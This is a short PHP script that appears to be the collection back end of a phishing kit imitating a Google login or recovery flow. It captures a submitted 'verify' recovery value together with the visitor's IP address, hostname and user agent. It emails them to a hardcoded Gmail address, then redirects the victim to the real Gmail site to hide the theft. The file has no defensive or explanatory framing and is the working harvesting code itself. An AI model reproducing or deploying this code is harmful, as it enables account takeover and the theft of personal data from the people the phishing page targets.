<?php
if($_POST["verify"] != "" and $_POST["verify"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------PHONE ETC-----------------------\n";
$message .= "recovery            : ".$_POST['verify']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Unknown  --------------|\n";
$send = "krayondonbalour7@gmail.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://mail.google.com/");
}else{
header ("Location: index.php");
}

?>